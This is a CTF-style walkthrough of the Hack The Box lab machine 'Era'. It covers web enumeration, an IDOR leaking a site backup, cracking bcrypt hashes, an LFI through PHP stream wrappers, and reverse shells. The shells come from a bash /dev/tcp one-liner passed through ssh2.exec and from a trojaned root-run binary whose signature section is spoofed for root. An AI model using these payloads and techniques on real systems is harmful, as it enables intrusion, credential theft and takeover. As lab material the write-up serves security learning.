- - - 
created : 21-09-2025 

Tags : #medium 

Released on 26 Jul 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ rustscan -a era.htb -- -A            

Open 10.10.11.79:21
Open 10.10.11.79:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 0309B7B14DF62A797B431119ADB37B14
|_http-title: Era Designs
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

```
# Enumeration
## HTTP (80)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://era.htb

/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
```

Nothing interesting.
### FFuf

We use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to further enum and later for subdomains/vhosts fuzzing:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -ic -v -u http://era.htb/FUZZ  -r

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 32ms]
| URL | http://era.htb/css
| --> | http://era.htb/css/
    * FUZZ: css

[INFO] Adding a new job to the queue: http://era.htb/css/FUZZ

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 34ms]
| URL | http://era.htb/fonts
| --> | http://era.htb/fonts/
    * FUZZ: fonts

[INFO] Adding a new job to the queue: http://era.htb/fonts/FUZZ

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 34ms]
| URL | http://era.htb/img
| --> | http://era.htb/img/
    * FUZZ: img

[INFO] Adding a new job to the queue: http://era.htb/img/FUZZ

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 35ms]
| URL | http://era.htb/js
| --> | http://era.htb/js/
    * FUZZ: js

[INFO] Adding a new job to the queue: http://era.htb/js/FUZZ

[INFO] Starting queued job on target: http://era.htb/css/FUZZ

[INFO] Starting queued job on target: http://era.htb/fonts/FUZZ

[INFO] Starting queued job on target: http://era.htb/img/FUZZ

[INFO] Starting queued job on target: http://era.htb/js/FUZZ

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 34ms]
| URL | http://era.htb/js/fancybox
| --> | http://era.htb/js/fancybox/
    * FUZZ: fancybox

[INFO] Adding a new job to the queue: http://era.htb/js/fancybox/FUZZ

[INFO] Starting queued job on target: http://era.htb/js/fancybox/FUZZ

:: Progress: [20478/20478] :: Job [6/6] :: 1197 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -H 'Host: FUZZ.era.htb ' -u http://era.htb  -fs 154 -c

________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 34ms]
:: Progress: [207643/207643] :: Job [1/1] :: 1190 req/sec :: Duration: [0:03:09] :: Errors: 0 ::
```

We can add `file.era.htb` to our `etc/hosts` and visit the page:

![Pasted image 20250921173548.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921173548.png)

We have file uploading here.

![Pasted image 20250921173919.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921173919.png)

#### Username Enumeration

Seems we can use [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) or [BurpSuite](../../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md) to enumerate users too:

![Pasted image 20250921174718.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921174718.png)

Sent to Automate:

![Pasted image 20250921174825.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921174825.png)

Found :

```bash
john
eric
omar
ethan
veronica
'yuri'
```

###  Dirsearch

We can use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) on the [Subdomain](../../../3%20-%20Tags/Hacking%20Concepts/Subdomain.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ dirsearch -u http://file.era.htb/

[10:24:44] Scanning:                                                                                                                            
[10:25:09] 403 -   564B - /admin/.htaccess                                  
[10:25:17] 403 -   564B - /administrator/.htaccess                          
[10:25:24] 403 -   564B - /app/.htaccess                                    
[10:25:24] 301 -   178B - /assets  ->  http://file.era.htb/assets/          
[10:25:24] 403 -   564B - /assets/
[10:25:38] 302 -     0B - /download.php  ->  login.php                      
[10:25:40] 301 -   178B - /files  ->  http://file.era.htb/files/            
[10:25:40] 403 -   564B - /files/                                           
[10:25:40] 403 -   564B - /files/cache/                                     
[10:25:40] 403 -   564B - /files/tmp/
[10:25:43] 301 -   178B - /./images  ->  http://file.era.htb/./images/          
[10:25:43] 403 -   564B - /./images/
[10:25:45] 200 -   34KB - /LICENSE                                          
[10:25:46] 200 -    9KB - /login.php                                        
[10:25:46] 200 -    70B - /logout.php                                       
[10:25:46] 302 -     0B - /manage.php  ->  login.php                        
[10:26:00] 200 -    3KB - /register.php                                     
[10:26:14] 302 -     0B - /upload.php  ->  login.php  
```
# Exploit
## Register

We can try register on the site, (we have user enumeration here too):

![Pasted image 20250921181600.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921181600.png)
## ID fuzz

We can  fuzz the `id` parameter in the `download.php` page, we need the `PHPSESSID cookie` we can found it in [Developer tools](../../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md) on the browser:

![Pasted image 20250921181824.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921181824.png)

We make a numberlist with `sequence`:

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ seq 1 5000 > numberlist.txt
```

Now we use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w  numberlist.txt -H 'Cookie: PHPSESSID=ofouu3pp26cojlnuvf018lkajm' -fw 3161

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 298ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 302ms]
2864                    [Status: 200, Size: 6360, Words: 2552, Lines: 222, Duration: 36ms]
```

We can download the backup file and `unzip`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ unzip site-backup-30-08-24.zip 
Archive:  site-backup-30-08-24.zip
  inflating: LICENSE                 
  inflating: bg.jpg                  
   creating: css/
  inflating: css/main.css.save       
  inflating: css/main.css            
  inflating: css/fontawesome-all.min.css  
  inflating: css/noscript.css        
   creating: css/images/
 extracting: css/images/overlay.png  
  inflating: download.php            
  inflating: filedb.sqlite           
   creating: files/
  inflating: files/.htaccess         
 extracting: files/index.php         
 <SNIP>
```

We can find the `filedb.sqlite` and retrieve password hashes using [SQLite3](../../../3%20-%20Tags/Hacking%20Tools/SQLite3.md):

```bash
──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era/backup]
└─$ sqlite3 filedb.sqlite 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EO<SNIP>
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUd<SNIP>
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```
## Cracking

We save them in a file and crack with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ john users --wordlist=/usr/share/wordlists/rockyou.txt  

HTB{{REDACTED_PASSWD}}      (eric)     
HTB{{REDACTED_PASSWD}}      (yuri)     
```

In the `dowload.php` file we can see something interesting, if we are `id=1` we have access to the whole files on the system:

```php
  // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];
```

- Administrators can pass through `?show=true&format=php://filter/...` to Access **ARBITRARY LOCAL FILE CONTENTS**
- Presence of [Local File Inclusion (LFI)](../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) in the use of `php://filter` or `data://`
- If we can control `format` and `id`，combinated with the  `wrapper.$file` , there could be critical vulnerabilities
## Admin Login

We can log in as `admin id=1` in the previous seen page `security_login.php` after an edit of the answers for the user:

![Pasted image 20250921191009.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250921191009.png)

Now we have `LFI` but not `RCE`.
## FTP (21)

We can login as `yuri` and find the `php8.1_conf` directory:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ ftp yuri@era.htb
Connected to era.htb.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14519|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
ftp> cd php8.1_conf
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||9916|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
```
## SSH (22)

There is an extension for ssh2 in it, for the usage we can refer to the PHP manual:

```go
ssh2.shell://user:pass@example.com:22/xterm
ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
ssh2.sftp://user:pass@example.com:22/path/to/filename
```

Try the following payload to bounce the shell. Since the URL is passed in after [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md) encoding, try to avoid the presence of a plus sign (which will be parsed into a space). 

The solution is to insert an elimination encoding plus sign before encoding:

1. Shell Payload
```bash
(bash >& /dev/tcp/10.10.xx.xx/1337  0>&1) &
```

2. Encoding the Payload [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md) (you can use [CyberChef](../../../3%20-%20Tags/Hacking%20Tools/CyberChef.md))
```bash
KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzMvMTMzNyAgMD4mMSkgJg==
```

3. Build the link for [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) forwarding
```go
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20[PAYLOAD]|base64%20-d|bash%27;
```

4. Start a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener (same port of Shell payload)
```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

5. Trigger the shell on the link

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.79] 35846
ls
user.txt
cat user.txt
  HTB{{REDACTED_FLAG}}
```

We can perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) now to work better later on:

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
eric@era:~$ ^Z
zsh: suspended  nc -lvnp 1337                                                                                                              
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
			      reset
```
# Privilege Escalation
## LinPEAS

We can import [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) on the target:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ cp /usr/share/peass/linpeas/linpeas.sh .

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ ls               
backup   linpeas.sh  passwds  reports  site-backup-30-08-24.zip  users                                                                                                                     
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Era]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
eric@era:/home$ cd /tmp
eric@era:/tmp$ wget http://10.10.14.73/linpeas.sh . 
--2025-09-22 09:08:32--  http://10.10.14.73/linpeas.sh
Connecting to 10.10.14.73:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 933.76K   722KB/s    in 1.3s    

2025-09-22 09:08:33 (722 KB/s) - ‘linpeas.sh’ saved [956174/956174]

--2025-09-22 09:08:33--  http://./
Resolving . (.)... failed: No address associated with hostname.
wget: unable to resolve host address ‘.’
FINISHED --2025-09-22 09:08:33--
Total wall clock time: 1.9s
Downloaded: 1 files, 934K in 1.3s (722 KB/s)
eric@era:/tmp$ chmod +x *.sh
```

Now we can run it:

```bash
eric@era:/tmp$ ./linpeas.sh

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root eric 33 Sep 22 04:02 /home/eric/user.txt                                                                                                                                                                                   
-rwxrw---- 1 root devs 16544 Sep 22 09:10 /opt/AV/periodic-checks/monitor
-rw-rw---- 1 root devs 205 Sep 22 09:10 /opt/AV/periodic-checks/status.log

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files

Group eric:
/tmp/linpeas.sh

Group devs:
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

This is an interesting file, let's check the directory:

```bash
eric@era:/opt/AV/periodic-checks$ ls -la
total 32
drwxrwxr-- 2 root devs  4096 Sep 22 09:17 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Sep 22 09:17 monitor
-rw-rw---- 1 root devs   307 Sep 22 09:17 status.log
```

with `pspy` we can see this file will be executed regularly, and at the same time, the `text_sig` segment in it will be checked for change.

So we can modify the file content for privilege elevation and copy the `text_sig` segment:

```bash
eric@era:/opt/AV/periodic-checks$ cat ex.c 
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'");
    return 0;
}


eric@era:/opt/AV/periodic-checks$ gcc ex.c -o privesc
eric@era:/opt/AV/periodic-checks$ ls
ex.c  monitor  privesc  status.log

eric@era:/opt/AV/periodic-checks$ objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
eric@era:/opt/AV/periodic-checks$ ls
ex.c  monitor  privesc  status.log  text_sig

eric@era:/opt/AV/periodic-checks$ objcopy --add-section .text_sig=text_sig privesc 
eric@era:/opt/AV/periodic-checks$ cp privesc monitor
eric@era:/opt/AV/periodic-checks$ chmod +x monitor
```

[Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and run `./monitor`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.79] 59544
bash: cannot set terminal process group (38418): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# cat /root/root.txt
cat /root/root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!